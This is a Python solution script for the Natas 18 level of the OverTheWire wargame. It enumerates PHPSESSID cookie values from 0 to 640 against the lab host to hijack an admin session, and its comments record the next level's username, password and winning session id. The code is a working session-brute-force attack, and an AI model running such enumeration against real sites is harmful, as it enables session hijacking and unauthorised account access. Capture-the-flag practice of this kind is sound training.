#!/usr/bin/env python

import requests

username = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

url = "http://%s.natas.labs.overthewire.org/" % username
session = requests.Session()

maxid = 640

for i in range(maxid + 1):
    cookie = {"PHPSESSID": str(i)}

    # post_data = {'username': 'admin', 'password': 'testme'}
    # response = session.post(url, data=post_data, cookies=cookie, auth=(username,password))

    response = session.get(url, cookies=cookie, auth=(username, password))
    content = response.text
    if "You are an admin." in content:
        print(content)
    else:
        print("trying id ", i)

# soup = BeautifulSoup(content,"html.parser").prettify()
# print (soup)

# by going to source page /index-source.html
# we may be able to enumerate the { PHPSESSID } in the cookie to get the right
# privillages for the admin then we be able to reveal the password
# there was no need to send any data, just the enumeration did it
# Username: natas19 with PHPSESSID = 118
# Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
